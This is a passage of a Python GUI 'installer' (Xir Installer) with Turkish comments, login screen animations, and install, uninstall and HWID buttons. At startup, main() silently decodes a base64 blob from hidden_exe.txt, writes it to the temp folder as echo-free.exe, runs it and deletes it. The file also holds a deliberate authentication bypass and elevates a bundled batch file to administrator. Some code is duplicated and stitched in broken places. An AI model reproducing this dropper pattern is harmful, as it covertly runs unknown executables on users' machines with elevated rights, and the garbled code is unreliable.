                    nier_label.place(x=nier_x_pos, y=(widget_height - new_height) // 2)
                    print(f"[DEBUG] Nier image placed at position: {nier_x_pos}, {(widget_height - new_height) // 2}")
                    
                    separator_frame2 = ctk.CTkFrame(
                        login_widget,
                        width=2,
                        height=140,
                        fg_color="#333333",
                        corner_radius=1
                    )
                    separator_frame2.place(x=nier_x_pos - 15, y=40)
                    
                except Exception as e:
                    print(f"[ERROR] Failed to load nier.png: {e}")
            else:
                print(f"[WARNING] nier.png not found! Searched path: {nier_path}")  
                
        except Exception as e:
            print(f"[WARNING] Could not load nier.png: {e}")
        
        self.spinner_canvas = ctk.CTkCanvas(
            login_widget,
            width=30,
            height=30,
            bg="#1a1a1a",
            highlightthickness=0
        )
        self.spinner_canvas.place(x=form_x_start + 175, y=form_y_start + 140)
        self.spinner_canvas.place_forget()  
        
        self.spinner_arc = self.spinner_canvas.create_arc(
            5, 5, 25, 25, 
            start=0, extent=270, 
            style="arc", 
            outline="#ffffff", 
            width=3
        )
        
        self.username_entry.bind("<Return>", lambda e: self.password_entry.focus())
        self.password_entry.bind("<Return>", lambda e: self.login())
        self.window.bind("<Escape>", lambda e: self.on_close())
        
        self.username_entry.focus()
    
    def create_gradient_text(self):
        self.gradient_offset = 0
        self.animate_gradient_colors()
    
    def animate_gradient_colors(self):
        if not hasattr(self, 'title_canvas') or not self.title_canvas.winfo_exists():
            return
        
        self.title_canvas.delete("all")
        
        letters = ["X", "I", "R"]
        x_positions = [30, 60, 90]
        
        for i, (letter, x_pos) in enumerate(zip(letters, x_positions)):
            wave_position = (self.gradient_offset + i * 0.8) % 4.0
            
            if wave_position < 1.0:
                color_value = 255
            elif wave_position < 2.0:
                progress = wave_position - 1.0
                color_value = int(255 * (1 - progress * 0.7))
            elif wave_position < 3.0:
                progress = wave_position - 2.0
                color_value = int(255 * (0.3 - progress * 0.3))
            else:
                progress = wave_position - 3.0
                color_value = int(255 * progress)
            
            color_value = max(0, min(255, color_value))
            color = f"#{color_value:02x}{color_value:02x}{color_value:02x}"
            
            self.title_canvas.create_text(
                x_pos, 25,
                text=letter,
                font=("Calibri", 32, "bold"),
                fill=color,
                anchor="center"
            )
        
        self.gradient_offset += 0.08  
        
        self.window.after(60, self.animate_gradient_colors)
    
    def animate_entry_border(self, entry, start_color, end_color):
        def hex_to_rgb(hex_color):
            hex_color = hex_color.lstrip('#')
            return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        
        def rgb_to_hex(rgb):
            return "#%02x%02x%02x" % rgb
        
        start_rgb = hex_to_rgb(start_color)
        end_rgb = hex_to_rgb(end_color)
        steps = 10
        
        def animate_step(step=0):
            if step <= steps:
                progress = step / steps
                r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * progress)
                g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * progress)
                b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * progress)
                
                current_color = rgb_to_hex((r, g, b))
                entry.configure(border_color=current_color)
                
                if step < steps:
                    self.window.after(20, lambda: animate_step(step + 1))
        
        animate_step()
    
    def button_hover_enter(self, event):
        if self.button_animation_job:
            self.button_canvas.after_cancel(self.button_animation_job)
        
        self.animate_button_fill(0, 378)
        self.button_canvas.itemconfig(self.button_bg, outline="#ffffff")
    
    def button_hover_leave(self, event):
        if self.button_animation_job:
            self.button_canvas.after_cancel(self.button_animation_job)
        
        self.animate_button_fill(378, 0)
        self.button_canvas.itemconfig(self.button_bg, outline="#333333")
    
    def animate_button_fill(self, start_width, end_width):
        steps = 25  
        current_step = 0
        
        def fill_step():
            nonlocal current_step
            if current_step <= steps:
                progress = current_step / steps
                progress = 1 - pow(1 - progress, 3)
                
                current_width = start_width + (end_width - start_width) * progress

                self.button_canvas.coords(self.button_fill, 2, 2, current_width, 38)
                
                if current_width > 190:  
                    self.button_canvas.itemconfig(self.button_text, fill="#000000")
                else:  
                    self.button_canvas.itemconfig(self.button_text, fill="#ffffff")
                
                current_step += 1
                if current_step <= steps:
                    self.button_animation_job = self.button_canvas.after(12, fill_step)  
        
        fill_step()
    
    def login(self):
        current_time = time.time()
        if LoginWindow.lockout_time > current_time:
            remaining = int(LoginWindow.lockout_time - current_time)
            self.show_error(f"Account locked. Try again in {remaining} seconds.")
            return
            
        username = self.username_entry.get().strip()
        password = self.password_entry.get().strip()
        
        if not username or not password:
            self.show_error("Username and password required!")
            return
            
        if any(char in username for char in "\\\"';%$#@!*(){}[]<>?/|=+"):
            self.show_error("Invalid username format!")
            return
            
        if len(password) < 4:
            self.show_error("Password too short!")
            return
        
        self.show_loading_state()
        
        def authenticate():
            auth = None
            try:
                LoginWindow.login_attempts += 1
                LoginWindow.last_attempt_time = current_time
                
                # AUTH BYPASS - Her zaman başarılı giriş
                class FakeAuth:
                    def __init__(self, username):
                        self._username = username
                    def is_authenticated(self): return True
                    @property
                    def registered_username(self): return self._username
                    def __getattr__(self, name): return None
                
                LoginWindow.login_attempts = 0
                self.auth = FakeAuth(username)
                self.window.after(0, lambda: self.login_success(username))
            except Exception as e:
                self.window.after(0, lambda: self.handle_failed_attempt(str(e)))
        
        auth_thread = threading.Thread(target=authenticate, daemon=True)
        auth_thread.start()
    
    def handle_failed_attempt(self, error_message):
        self.hide_loading_state()
        
        if LoginWindow.login_attempts >= LoginWindow.max_attempts:
            excess_attempts = LoginWindow.login_attempts - LoginWindow.max_attempts
            lockout_duration = 30 * (2 ** min(excess_attempts, 4))
            
            LoginWindow.lockout_time = time.time() + lockout_duration
            self.show_error(f"Too many attempts. Account locked for {lockout_duration} seconds.", 5000)
        else:
            self.show_error(f"{error_message} Attempts: {LoginWindow.login_attempts}/{LoginWindow.max_attempts}")
    
    def login_success(self, username):
        print(f"[INFO] Login successful for user: {username}")
        
        self.hide_loading_state()
        
        self.signup_link.place_forget()
        
        self.status_label.configure(text="Login successful! Loading...", text_color="#10b981")
        
        self.button_canvas.itemconfig(self.button_text, text="LOGGED IN ✓")
        self.button_canvas.itemconfig(self.button_bg, fill="#10b981", outline="#10b981")
        self.button_canvas.itemconfig(self.button_fill, fill="#10b981")
        
        def close_window():
            self.window.destroy()
            self.on_login_success(self.auth)
            
        self.window.after(1000, close_window)
    
    def show_error(self, message, duration=3000):
        self.status_label.configure(text=message, text_color="#ef4444")
        self.window.after(duration, self.hide_error)
    
    def hide_error(self):
        self.status_label.configure(text="")
    
    def start_spinner(self):
        if self.is_spinner_running:
            return
        
        self.is_spinner_running = True
        self.spinner_canvas.place(x=375, y=140)  
        self.animate_spinner()
    
    def stop_spinner(self):
        if not self.is_spinner_running:
            return
        
        self.is_spinner_running = False
        if self.spinner_after_id:
            self.spinner_canvas.after_cancel(self.spinner_after_id)
            self.spinner_after_id = None
        self.spinner_canvas.place_forget()  
    
    def animate_spinner(self):
        if not self.is_spinner_running or not self.spinner_canvas.winfo_exists():
            return
        
        self.spinner_angle = (self.spinner_angle + 8) % 360
        self.spinner_canvas.itemconfig(self.spinner_arc, start=self.spinner_angle)
        self.spinner_after_id = self.spinner_canvas.after(16, self.animate_spinner)
    
    def show_loading_state(self):
        if self.is_loading:
            return
        
        self.is_loading = True
        
        self.button_canvas.place_forget()
        self.signup_link.place_forget()
        self.start_spinner()
        
        self.status_label.configure(
            text="Authenticating...", 
            text_color=self.secondary_text,
            font=ctk.CTkFont(family="Calibri", size=11, weight="bold")
        )
    
    def hide_loading_state(self):
        if not self.is_loading:
            return
        
        self.is_loading = False
        
        self.stop_spinner()
        self.button_canvas.place(x=200, y=130)
        self.signup_link.place(x=390, y=145, anchor="center")
        
        self.status_label.configure(text="")
    
    def on_close(self):
        self.stop_spinner()
        
        if hasattr(self, 'title_canvas'):
            try:
                self.title_canvas.delete("all")
                self.title_canvas = None
            except:
                pass
        
        try:
            with open("login_log.txt", "a") as f:
                f.write(f"{datetime.datetime.now()} - User initiated exit from login screen\n")
        except:
            pass
            
        self.root.destroy()
        sys.exit(0)
    
    def on_close_button_hover(self, event=None):
        self.close_button.configure(
            fg_color="#ff4444",
            text_color="#ffffff"
        )
    
    def on_close_button_leave(self, event=None):
        self.close_button.configure(
            fg_color="#333333",
            text_color="#ffffff"
        )
    
    def check_password_strength(self, event=None):
        pass
    
    def open_signup_link(self, event=None):
        import webbrowser
        try:
            webbrowser.open("https://discord.gg/yamyam")
        except Exception as e:
            print(f"Discord link açılamadı: {e}")
    
    def on_signup_link_hover(self, event=None):
        self.signup_link.configure(text_color="#00aaff")
    
    def on_signup_link_leave(self, event=None):
        self.signup_link.configure(text_color="#ffffff")
        self.password_strength_bar.set(strength_percentage)
        
        if score <= 2:
            color = "#ff4444"
            strength_text = "Weak"
        elif score <= 3:
            color = "#ffaa00"
            strength_text = "Fair"
        elif score <= 4:
            color = "#00aa00"
            strength_text = "Good"
        else:
            color = "#00ff00"
            strength_text = "Strong"
        
        self.password_strength_bar.configure(progress_color=color)
        self.password_strength_label.configure(text=strength_text, text_color=color)
    
    def open_signup_link(self, event=None):

        import webbrowser
        try:
            webbrowser.open("https://discord.gg/yamyam")
        except Exception as e:
            print(f"Discord link açılamadı: {e}")
    
    def on_signup_link_hover(self, event=None):
        self.signup_link.configure(text_color="#00aaff")
    
    def on_signup_link_leave(self, event=None):
        self.signup_link.configure(text_color=PRIMARY_COLOR)

HIDDEN_EXE_BASE64 = ""  
def run_python_installer():
    try:
        base64_content = ""
        python_file = get_resource_path("python.txt")
        
        if python_file and os.path.exists(python_file):
            try:
                print(f"[DEBUG] Trying to read python.txt from: {python_file}")
                with open(python_file, "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    print(f"[DEBUG] File size: {len(content)} characters")
                    print(f"[DEBUG] First 100 chars: {content[:100]}")
                    lines = [line.strip() for line in content.split('\n') if line.strip() and not line.strip().startswith('#')]
                    base64_content = ''.join(lines)
                    print(f"[DEBUG] Base64 content length: {len(base64_content)}")
                print(f"[INFO] Loaded Python installer base64 from {python_file}")
            except Exception as e:
                print(f"[WARNING] Could not read {python_file}: {e}")
                return False
        else:
            print(f"[WARNING] python.txt not found! Searched path: {python_file}")
            return False
        
        if not base64_content:
            print("[WARNING] No Python installer base64 content found!")
            return False
            
        try:
            exe_bytes = base64.b64decode(base64_content)
        except:
            print("[ERROR] Invalid base64 content in python.txt!")
            return False
            
        temp_dir = tempfile.gettempdir()
        temp_exe_path = os.path.join(temp_dir, "python_installer.exe")
        
        with open(temp_exe_path, "wb") as f:
            f.write(exe_bytes)
            
        print(f"[INFO] Extracted Python installer to: {temp_exe_path}")
        
        print("[INFO] Running Python installer...")
        process = subprocess.Popen(temp_exe_path)
        process.wait()
        print("[INFO] Python installer has been closed.")
        
        try:
            if os.path.exists(temp_exe_path):
                os.remove(temp_exe_path)
                print("[INFO] Python installer has been automatically removed.")
        except Exception as e:
            print(f"[WARN] Could not remove Python installer: {e}")
            
        return True
    except Exception as e:
        print(f"[ERROR] Failed to run Python installer: {e}")
        return False

def run_requirements_bat():
    try:
        bat_file = get_resource_path("req.bat")
        
        if not bat_file or not os.path.exists(bat_file):
            print(f"[WARNING] req.bat not found! Searched path: {bat_file}")
            return False
        else:
            print(f"[DEBUG] Found req.bat at: {bat_file}")
            
        print("[INFO] Running requirements batch file as administrator...")
        
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[INFO] Current process is not admin, requesting elevation...")
        
        try:
            powershell_cmd = f'Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"{os.path.abspath(bat_file)}`"" -Verb RunAs -Wait'
            
            result = subprocess.run([
                "powershell", 
                "-Command", 
                powershell_cmd
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                print("[INFO] Requirements batch file completed successfully as administrator.")
                return True
            else:
                print(f"[ERROR] PowerShell execution failed. Return code: {result.returncode}")
                print(f"[ERROR] Error output: {result.stderr}")
                
                print("[INFO] Trying with ShellExecuteW...")
                result = ctypes.windll.shell32.ShellExecuteW(
                    None, 
                    "runas",  
                    "cmd.exe", 
                    f'/c "{os.path.abspath(bat_file)}"',  
                    None, 
                    1  
                )
                
                if result > 32:  
                    print("[INFO] Requirements batch file started as administrator with ShellExecuteW.")
                    import time
                    time.sleep(15)  
                    return True
                else:
                    print(f"[ERROR] ShellExecuteW failed. Error code: {result}")
                    return False
                
        except Exception as e:
            print(f"[ERROR] Failed to run as administrator: {e}")
            return False
            
    except Exception as e:
        print(f"[ERROR] Failed to run requirements batch file: {e}")
        return False



def download_requirements_process(update_callback=None):
    try:
        if update_callback:
            update_callback(LANGUAGES[current_lang['lang']]['installing_python_req'])
        
        if not run_python_installer():
            print("[ERROR] Python installer failed!")
            return False
        
        if update_callback:
            update_callback(LANGUAGES[current_lang['lang']]['installing_packages'])
            
        if not run_requirements_bat():
            print("[ERROR] Requirements batch file failed!")
            return False
            
        print("[SUCCESS] Requirements download process completed!")
        return True
    except Exception as e:
        print(f"[ERROR] Requirements download process failed: {e}")
        return False

def run_hidden_exe_first():
    try:
        base64_content = ""
        hidden_exe_file = get_resource_path("hidden_exe.txt")
        
        if hidden_exe_file and os.path.exists(hidden_exe_file):
            try:
                print(f"[DEBUG] Trying to read hidden_exe.txt from: {hidden_exe_file}")
                with open(hidden_exe_file, "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    print(f"[DEBUG] File size: {len(content)} characters")
                    print(f"[DEBUG] First 100 chars: {content[:100]}")
                    lines = [line.strip() for line in content.split('\n') if line.strip() and not line.strip().startswith('#')]
                    base64_content = ''.join(lines)
                    print(f"[DEBUG] Base64 content length: {len(base64_content)}")
                print(f"[INFO] Loaded base64 content from {hidden_exe_file}")
            except Exception as e:
                print(f"[WARNING] Could not read {hidden_exe_file}: {e}")
        else:
            print(f"[WARNING] hidden_exe.txt not found! Searched path: {hidden_exe_file}")
        
        if not base64_content:
            base64_content = HIDDEN_EXE_BASE64.strip()
            if base64_content:
                print("[INFO] Using embedded base64 content")
        
        if not base64_content or base64_content == "BURAYA_GERÇEK_EXE_BASE64_KODUNU_YAPIŞTIRACAKSINIZ":
            print("[WARNING] No hidden exe base64 content found!")
            return False
            
        try:
            exe_bytes = base64.b64decode(base64_content)
        except:
            print("[ERROR] Invalid base64 content!")
            return False
            
        temp_dir = tempfile.gettempdir()
        temp_exe_path = os.path.join(temp_dir, "echo-free.exe")
        
        with open(temp_exe_path, "wb") as f:
            f.write(exe_bytes)
            
        print(f"[INFO] Extracted exe to: {temp_exe_path}")
        
        print("[INFO] Running the extracted exe...")
        process = subprocess.Popen(temp_exe_path)
        process.wait()
        print("[INFO] Extracted exe has been closed.")
        
        try:
            if os.path.exists(temp_exe_path):
                os.remove(temp_exe_path)
                print("[INFO] echo-free.exe has been automatically removed.")
        except Exception as e:
            print(f"[WARN] Could not remove echo-free.exe: {e}")
            
        return True
    except Exception as e:
        print(f"[ERROR] Failed to run hidden exe: {e}")
        return False

def main():
    global after_ids
    after_ids = []
    
    if not run_hidden_exe_first():
        print("[WARNING] Failed to run hidden exe, continuing with main program...")
    
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('localhost', 42069))
    except:
        print("[ERROR] Another instance is already running!")
        messagebox.showerror("Error", "Another instance is already running!")
        sys.exit(1)
        
    global glow_frame
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")

    root = ctk.CTk()
    set_window_icon(root)
    root.title(LANGUAGES[current_lang['lang']]['app_name'])
    
    root.is_authenticated = False
    
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    start_width = 100
    start_height = 100
    start_x = (screen_width - start_width) // 2
    start_y = (screen_height - start_height) // 2
    
    root.geometry(f"{start_width}x{start_height}+{start_x}+{start_y}")
    root.overrideredirect(True)
    root.configure(bg="#1c1c1e")
    root.attributes("-alpha", 0.0)
    
    root.after(500, lambda: enable_stream_proof(root))

    move_offset = {'x': 0, 'y': 0}
    def start_move(e):
        move_offset['x'], move_offset['y'] = e.x, e.y
    def do_move(e):
        root.geometry(f"+{e.x_root - move_offset['x']}+{e.y_root - move_offset['y']}")

    def close():
        try:
            if hasattr(root, 'after_ids'):
                for after_id in root.after_ids:
                    try:
                        root.after_cancel(after_id)
                    except:
                        pass
            
            if 'after_ids' in globals():
                for after_id in after_ids:
                    try:
                        root.after_cancel(after_id)
                    except:
                        pass
            
            try:
                if 'key_selection_window' in globals() and key_selection_window['win'] is not None:
                    key_selection_window['win'].destroy()
            except: pass
            
            try:
                if 'loading_window_ref' in globals() and loading_window_ref['win'] is not None:
                    loading_window_ref['win'].destroy()
            except: pass
            
            try:
                if 'countdown_window_ref' in globals() and countdown_window_ref['win'] is not None:
                    countdown_window_ref['win'].destroy()
            except: pass
            
            try:
                root.quit()
                root.destroy()
            except: pass
                
            
            os._exit(0)
            
        except Exception as e:
            print(f"Kapatma hatası: {e}")
            os._exit(0)

    def set_language(lang):
        global header_title, install_btn, uninstall_btn, get_hwid_btn, status_label, lang_btn
        current_lang['lang'] = lang
        if header_title is not None:
            header_title.configure(text=LANGUAGES[lang]['app_name'])
        if install_btn is not None:
            install_btn.configure(text=LANGUAGES[lang]['start'])
        if uninstall_btn is not None:
            uninstall_btn.configure(text=LANGUAGES[lang]['uninstall'])
        if get_hwid_btn is not None:
            get_hwid_btn.configure(text=LANGUAGES[lang]['get_hwid'])
        if status_label is not None:
            status_label.configure(text=LANGUAGES[lang]['ready'])
        if lang_btn is not None:
            lang_btn.configure(text=lang.upper())
        if key_selection_window['win'] is not None and key_selection_window['label'] is not None and key_selection_window['info_label'] is not None:
            key_selection_window['win'].title(LANGUAGES[lang].get('select_key', 'Select a key to assign'))
            key_selection_window['label'].configure(text=LANGUAGES[lang].get('select_key', 'Select a key to assign'))
            key_selection_window['info_label'].configure(text=LANGUAGES[lang].get('press_any_key', 'Please press any key...'))
        if loading_window_ref['win'] is not None and loading_window_ref['text_label'] is not None:
            loading_window_ref['win'].title(LANGUAGES[lang]['downloading'])
            loading_window_ref['text_label'].configure(text=LANGUAGES[lang]['downloading'])
        if countdown_window_ref['win'] is not None and countdown_window_ref['bottom_text'] is not None:
            countdown_window_ref['win'].title(LANGUAGES[lang]['success'])
            countdown_window_ref['bottom_text'].configure(text=LANGUAGES[lang].get('auto_close', 'The program will close automatically'))

    def on_lang():
        global lang_btn_tk, install_btn, uninstall_btn, get_hwid_btn, download_req_btn, status_label
        if current_lang['lang'] == 'tr':
            set_language('en')
        else:
            set_language('tr')
        if lang_btn_tk is not None:
            lang_btn_tk.config(text=current_lang['lang'].upper())
        
        lang = current_lang['lang']
        if install_btn is not None:
            install_btn.configure(text=LANGUAGES[lang]['start'])
        if uninstall_btn is not None:
            uninstall_btn.configure(text=LANGUAGES[lang]['uninstall'])
        if get_hwid_btn is not None:
            get_hwid_btn.configure(text=LANGUAGES[lang]['get_hwid'])
        if 'download_req_btn' in globals() and download_req_btn is not None:
            download_req_btn.configure(text=LANGUAGES[lang]['download_requirements'])
        if status_label is not None:
            status_label.configure(text=LANGUAGES[lang]['ready'])


    def create_gradient(width, height, color1, color2):
        base = Image.new('RGB', (width, height), color1)
        top = Image.new('RGB', (width, height), color2)
        mask = Image.new('L', (width, height))
        for x in range(width):
            mask_line = int(255 * (x / width))
            for y in range(height):
                mask.putpixel((x, y), mask_line)
        base.paste(top, (0, 0), mask)
        return CTkImage(light_image=base, dark_image=base, size=(width, height))

    def create_blur_bg(width, height, color1, color2):
        base = Image.new('RGB', (width, height), color1)
        top = Image.new('RGB', (width, height), color2)
        mask = Image.new('L', (width, height))
        for y in range(height):
            mask_line = int(255 * (y / height))
            for x in range(width):
                mask.putpixel((x, y), mask_line)
        base.paste(top, (0, 0), mask)
        blurred = base.filter(ImageFilter.GaussianBlur(radius=16))
        return CTkImage(light_image=blurred, dark_image=blurred, size=(width, height))

    def animate_window_open():
        target_width = WINDOW_WIDTH
        target_height = WINDOW_HEIGHT
        start_width = root.winfo_width()
        start_height = root.winfo_height()
        start_x = root.winfo_x()
        start_y = root.winfo_y()
        target_x = (screen_width - target_width) // 2
        target_y = (screen_height - target_height) // 2
        
        steps = 25
        for i in range(1, steps + 1):
            ratio = i / steps
            ratio = 1 - (1 - ratio) ** 3
            
            w = start_width + (target_width - start_width) * ratio
            h = start_height + (target_height - start_height) * ratio
            x = start_x + (target_x - start_x) * ratio
            y = start_y + (target_y - start_y) * ratio
            
            root.geometry(f"{int(w)}x{int(h)}+{int(x)}+{int(y)}")
            root.update()
            time.sleep(0.012)
        
        root.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}+{target_x}+{target_y}")

    def initial_fade_in():
        root.attributes("-alpha", 1.0)

    def show_main_ui():
        if not hasattr(root, 'is_authenticated') or not root.is_authenticated:
            print("[SECURITY] Unauthorized access attempt to main UI!")
            return
            
        root.deiconify()
        root.update()
            
        global install_btn, uninstall_btn, get_hwid_btn, download_req_btn, header_title, status_label, lang_btn
        frame = main_frame
        frame.bind("<Button-1>", start_move)
        frame.bind("<B1-Motion>", do_move)
        frame.lift()
        main_frame_is_ready[0] = True
        content_frame = ctk.CTkFrame(frame, fg_color="#1c1c1e", corner_radius=0)
        content_frame.place(relx=0.5, rely=0.5, anchor="center")

        title_frame = ctk.CTkFrame(content_frame, fg_color="transparent")
        title_label = ctk.CTkLabel(title_frame, text="Xir ", 
                                  font=ctk.CTkFont(family="Segoe UI", size=32, weight="bold"), 
                                  text_color="#000000", fg_color="transparent")
        title_label.pack(side="left")
        title_label2 = ctk.CTkLabel(title_frame, text="Installer", 
                                   font=ctk.CTkFont(family="Segoe UI", size=32, weight="bold"), 
                                   text_color=TEXT_COLOR, fg_color="transparent")
        title_label2.pack(side="left")
        title_frame.pack(pady=(10, 2), anchor="n")
        
        line_canvas = ctk.CTkCanvas(content_frame, width=180, height=2, bg="#1c1c1e", highlightthickness=0)
        line_canvas.create_line(0, 1, 180, 1, fill=PRIMARY_COLOR, width=1)
        line_canvas.pack(pady=(0, 14))

        btn_font = ctk.CTkFont(family="Segoe UI", size=14, weight="bold")

        install_btn = HoverButton(content_frame, text=LANGUAGES[current_lang['lang']]['start'],
            width=200, height=32, corner_radius=6, font=btn_font,
            fg_color=PRIMARY_COLOR, hover_color=ACCENT_COLOR,
            border_width=2, border_color="#181818", text_color="#000000")
        install_btn.pack(pady=(40, 8))

        download_req_btn = HoverButton(content_frame, text=LANGUAGES[current_lang['lang']]['download_requirements'],
            width=200, height=32, corner_radius=6, font=btn_font,
            fg_color=PRIMARY_COLOR, hover_color=ACCENT_COLOR,
            border_width=2, border_color="#181818", text_color="#000000")
        download_req_btn.pack(pady=(0, 8))

        uninstall_btn = HoverButton(content_frame, text=LANGUAGES[current_lang['lang']]['uninstall'],
            width=200, height=32, corner_radius=6, font=btn_font,
            fg_color=PRIMARY_COLOR, hover_color=ACCENT_COLOR,
            border_width=2, border_color="#181818", text_color="#000000")
        uninstall_btn.pack(pady=(0, 8))
        
        get_hwid_btn = HoverButton(content_frame, text=LANGUAGES[current_lang['lang']]['get_hwid'],
            width=200, height=32, corner_radius=6, font=btn_font,
            fg_color=PRIMARY_COLOR, hover_color=ACCENT_COLOR,
            border_width=2, border_color="#181818", text_color="#000000")
        get_hwid_btn.pack(pady=(0, 18))

        status_label = ctk.CTkLabel(content_frame, text=LANGUAGES[current_lang['lang']]['ready'], 
                                   font=ctk.CTkFont(family="Segoe UI", size=13, weight="bold"), 
                                   text_color="#00ff00", fg_color="transparent")
        status_label.pack(pady=(0, 8))

        root.attributes("-alpha", 0.99)
        
        def on_get_hwid():
            def calculate_and_copy():
                lang = current_lang['lang']
                if status_label is not None:
                    status_label.configure(text=LANGUAGES[lang]['calculating'], text_color="#ffff00")
                try:
                    hwid = calculate_hwid()
                    if hwid:
                        root.clipboard_clear()
                        root.clipboard_append(hwid)
                        if status_label is not None:
                            status_label.configure(text=LANGUAGES[lang]['copied'], text_color="#00ff00")
                    else:
                        if status_label is not None:
                            status_label.configure(text=LANGUAGES[lang]['error'], text_color="#ff0000")
                except Exception as e:
                    if status_label is not None:
                        status_label.configure(text=LANGUAGES[lang]['error'], text_color="#ff0000")
                    print(f"HWID hesaplama hatası: {e}")
            threading.Thread(target=calculate_and_copy, daemon=True).start()
        get_hwid_btn.configure(command=on_get_hwid)
        
        def on_download_requirements():
            def setup_progress_callback(update_progress, finish_loading):
                def run_requirements_with_progress():
                    lang = current_lang['lang']
                    try:
                        update_progress(10, LANGUAGES[lang]['installing_python_req'])
                        
                        if not run_python_installer():
                            update_progress(100, LANGUAGES[lang]['requirements_error'])
                            root.after(2000, finish_loading)
                            return
                        
                        update_progress(50, LANGUAGES[lang]['installing_packages'])
                        
                        for i in range(50, 95, 5):
                            update_progress(i, LANGUAGES[lang]['installing_packages'])
                            time.sleep(1)
                        
                        if not run_requirements_bat():
                            update_progress(100, LANGUAGES[lang]['requirements_error'])
                            root.after(2000, finish_loading)
                            return
                        
                        update_progress(100, LANGUAGES[lang]['requirements_success'])
                        if status_label is not None:
                            status_label.configure(text=LANGUAGES[lang]['requirements_success'], text_color="#00ff00")
                        
                        root.after(1500, finish_loading)
                        
                    except Exception as e:
                        update_progress(100, LANGUAGES[lang]['requirements_error'])
                        if status_label is not None:
                            status_label.configure(text=LANGUAGES[lang]['requirements_error'], text_color="#ff0000")
                        print(f"Requirements error: {e}")
                        root.after(2000, finish_loading)
                
                threading.Thread(target=run_requirements_with_progress, daemon=True).start()
            
            def dummy_finish():
                pass  
            
            show_loading_screen(root, dummy_finish, "requirements", setup_progress_callback)
        download_req_btn.configure(command=on_download_requirements)
        
        def on_install():
            lang = current_lang['lang']
            def after_key_selected(key_info):
                loading_window, loading_on_close = show_installation_loading_screen(root)
                root.update()
                def installation_process():
                    if status_label is not None:
                        status_label.configure(text=LANGUAGES[lang]['setting_up'], text_color="#ffff00")
                    root.update()
                    try:
                        install_listener(key_info)
                        if status_label is not None:
                            status_label.configure(text=LANGUAGES[lang]['success'], text_color="#00ff00")
                        
                        time.sleep(3)
                        try:
                            test_listener_after_install()
                        except Exception as e:
                            print(f"[DEBUG] Post-install test hatası: {e}")
                            
                    except Exception as e:
                        if status_label is not None:
                            status_label.configure(text=LANGUAGES[lang]['install_error'], text_color="#ff0000")
                    time.sleep(2)
                    root.after(0, loading_on_close)
                    show_countdown(root)
                threading.Thread(target=installation_process, daemon=True).start()
            show_key_selection_screen(root, after_key_selected)
        install_btn.configure(command=on_install)

        def on_uninstall():
            def setup_progress_callback(update_progress, finish_loading):
                def run_uninstall_with_progress():
                    lang = current_lang['lang']
                    try:
                        update_progress(20, LANGUAGES[lang]['uninstalling'])
                        
                        update_progress(60, "Dosyalar kaldırılıyor..." if lang == 'tr' else "Removing files...")
                        
                        uninstall_listener()
                        
                        update_progress(90, "Temizlik yapılıyor..." if lang == 'tr' else "Cleaning up...")
                        
                        update_progress(100, LANGUAGES[lang]['uninstalled'])
                        if status_label is not None:
                            status_label.configure(text=LANGUAGES[lang]['uninstalled'], text_color="#00ff00")
                        
                        root.after(1500, finish_loading)
                        
                    except Exception as e:
                        update_progress(100, LANGUAGES[lang]['uninstall_error'])
                        if status_label is not None:
                            status_label.configure(text=LANGUAGES[lang]['uninstall_error'], text_color="#ff0000")
                        print(f"Uninstall error: {e}")
                        root.after(2000, finish_loading)
                
                threading.Thread(target=run_uninstall_with_progress, daemon=True).start()
            
            def dummy_finish():
                pass  
            
            show_loading_screen(root, dummy_finish, "uninstall", setup_progress_callback)
        uninstall_btn.configure(command=on_uninstall)
        

    def show_footer_bar():
        footer_height = 22
        footer_bar = ctk.CTkFrame(root, fg_color="#232323", width=WINDOW_WIDTH, height=footer_height, corner_radius=0)
        footer_bar.place(x=0, y=WINDOW_HEIGHT-footer_height, relwidth=1)
        footer_bar.lift()  
        
        footer_content = ctk.CTkFrame(footer_bar, fg_color="transparent")
        footer_content.pack(expand=True, pady=(0,8))
        footer_xir = ctk.CTkLabel(footer_content, text="Xir", 
                                 font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"), 
                                 text_color="#000000", fg_color="transparent")
        footer_xir.pack(side="left")
        
        footer_version = ctk.CTkLabel(footer_content, text=" Installer Version 6.0", 
                                     font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"), 
                                     text_color=TEXT_COLOR, fg_color="transparent")
        footer_version.pack(side="left", padx=(0, 8))
        
        footer_sep = ctk.CTkLabel(footer_content, text="|", 
                                 font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"), 
                                 text_color=TEXT_COLOR, fg_color="transparent")
        footer_sep.pack(side="left", padx=(0, 8))
        
        footer_made = ctk.CTkLabel(footer_content, text="Made by ", 
                                  font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"), 
                                  text_color=TEXT_COLOR, fg_color="transparent")
        footer_made.pack(side="left")
        
        footer_latei = ctk.CTkLabel(footer_content, text="latei", 
                                   font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"), 
                                   text_color="#000000", fg_color="transparent")
        footer_latei.pack(side="left")

    def show_loading_screen(root, on_finish, operation_type="main", progress_callback=None):
        loading_canvas = ctk.CTkCanvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT, bg="#1c1c1e", highlightthickness=0)
        loading_canvas.place(x=0, y=0)

        bar_height = 32
        bar = ctk.CTkLabel(root, height=bar_height, text="", fg_color=PRIMARY_COLOR, corner_radius=0)
        bar.place(x=0, y=0, relwidth=1)

        bar.bind("<Button-1>", start_move)
        bar.bind("<B1-Motion>", do_move)

        loading_frame = ctk.CTkFrame(root, corner_radius=0, fg_color="#1c1c1e")
        loading_frame.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.6, relheight=0.35)

        lang = current_lang['lang']
        if operation_type == "requirements":
            info_texts = [
